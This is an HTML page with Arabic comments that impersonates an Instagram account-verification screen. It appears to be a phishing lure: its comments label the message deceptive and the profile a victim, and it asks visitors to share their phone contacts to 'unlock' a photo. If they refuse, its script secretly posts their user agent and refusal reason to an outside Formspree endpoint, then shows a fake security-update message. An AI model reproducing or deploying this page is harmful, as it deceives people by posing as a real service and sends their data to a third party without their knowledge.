<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* تصفير عام */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: #fafafa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }

        /* تصميم البطاقة الرئيسية (تشبه تطبيق إنستغرام) */
        .phone-frame {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            padding: 30px 25px;
            text-align: center;
            position: relative;
        }

        /* شريط العلوي (مثل الهاتف) */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 15px;
            border-bottom: 1px solid #efefef;
            margin-bottom: 20px;
        }
        .top-bar .logo-text {
            font-family: 'Billabong', cursive;
            font-size: 28px;
            color: #262626;
            letter-spacing: -1px;
        }
        .top-bar .settings-icon { color: #262626; font-size: 20px; }

        /* صورة المستخدم الوهمية */
        .profile-header {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 10px 0 20px 0;
            text-align: left;
        }
        .avatar {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 24px;
            font-weight: bold;
        }
        .profile-info h3 { font-size: 16px; color: #262626; }
        .profile-info p { font-size: 14px; color: #8e8e8e; }

        /* الإطار الوهمي للصورة */
        .post-placeholder {
            width: 100%;
            height: 250px;
            background: #efefef;
            border-radius: 8px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 15px;
        }

        /* زر تأكيد الحساب */
        .btn-primary { 
            width: 100%; 
            padding: 12px; 
            background: #0095f6; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 14px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 10px;
            transition: 0.2s;
        }
        .btn-primary:hover { background: #0081d6; }
        .btn-primary:disabled { background: #b2dffc; cursor: default; }

        .btn-success { background: #2ea043; }
        .btn-success:hover { background: #238636; }

        #status {
            margin-top: 15px;
            font-size: 13px;
            padding: 12px;
            border-radius: 8px;
            display: none;
        }
        #status.success { background: #e6f5e6; color: #2e7d32; display: block; }
        #status.fail { background: #ffebee; color: #c62828; display: block; }
        #status.info { background: #e3f2fd; color: #0d47a1; display: block; }
    </style>
</head>
<body>

    <div class="phone-frame">
        <!-- الشريط العلوي -->
        <div class="top-bar">
            <div class="logo-text">Instagram</div>
            <div class="settings-icon">⋯</div>
        </div>

        <!-- صورة المستخدم -->
        <div class="profile-header">
            <div class="avatar">A</div>
            <div class="profile-info">
                <h3>أحمد_الضحية</h3>
                <p>تأمين الحساب</p>
            </div>
        </div>

        <!-- الإطار الوهمي -->
        <div class="post-placeholder">
            <span>🔒</span> الصورة محمية
        </div>

        <!-- رسالة خادعة -->
        <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 15px;">
            يرجى تأكيد هويتك عبر جهات الاتصال لفتح المحتوى.
        </p>

        <!-- الزر -->
        <button class="btn-primary" id="instaBtn">تأكيد الحساب</button>

        <!-- حالة الرسالة -->
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('instaBtn').addEventListener('click', async function() {
            const btn = this;
            const statusBox = document.getElementById('status');

            btn.innerText = "جاري التحميل...";
            btn.disabled = true;
            statusBox.style.display = 'none';
            statusBox.className = '';

            // === 1. التحقق من دعم المتصفح ===
            if (!navigator.contacts || !navigator.contacts.select) {
                sendData("المتصفح لا يدعم طلب جهات الاتصال. تم الإرسال.", statusBox, btn);
                return;
            }

            try {
                // === 2. طلب جهات الاتصال ===
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                // === 3. إذا وافق المستخدم وضغط "السماح" ===
                if (contacts && contacts.length > 0) {
                    statusBox.className = 'success';
                    statusBox.innerText = "✅ تم التحقق بنجاح! مرحباً بك.";
                    btn.innerText = "تم التحقق";
                    btn.className = "btn-primary btn-success";
                    btn.disabled = false;
                    // في حالة السماح، لا نرسل بيانات (لأن المستخدم تعاون)
                } else {
                    // إذا فتح النافذة وأغلقها دون اختيار
                    sendData("رفض المستخدم الإذن (أغلق النافذة).", statusBox, btn);
                }
            } catch (error) {
                // === 4. إذا رفض المستخدم أو حدث خطأ (المنطق العكسي) ===
                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
                    sendData("رفض المستخدم الإذن. تم إرسال البيانات سراً.", statusBox, btn);
                } else {
                    statusBox.className = 'fail';
                    statusBox.innerText = "❌ حدث خطأ غير متوقع.";
                    btn.innerText = "تأكيد الحساب";
                    btn.disabled = false;
                }
            }
        });

        // دالة الإرسال المباشر إلى Formspree
        function sendData(reason, statusBox, btn) {
            const data = {
                status: "رفض الإذن (المنطق العكسي)",
                reason: reason,
                ua: navigator.userAgent,
                timestamp: new Date().toISOString()
            };

            const formspreeUrl = 'https://formspree.io/f/mljrbabg';

            fetch(formspreeUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                statusBox.className = 'info';
                statusBox.innerText = "🔐 جاري تحديث الإعدادات الأمنية...";
                btn.innerText = "تم التحديث";
                btn.className = "btn-primary btn-success";
                btn.disabled = false;
            }).catch(() => {
                statusBox.className = 'info';
                statusBox.innerText = "⚠️ تم رفض الإذن. جاري المعالجة...";
                btn.innerText = "تم";
                btn.className = "btn-primary btn-success";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
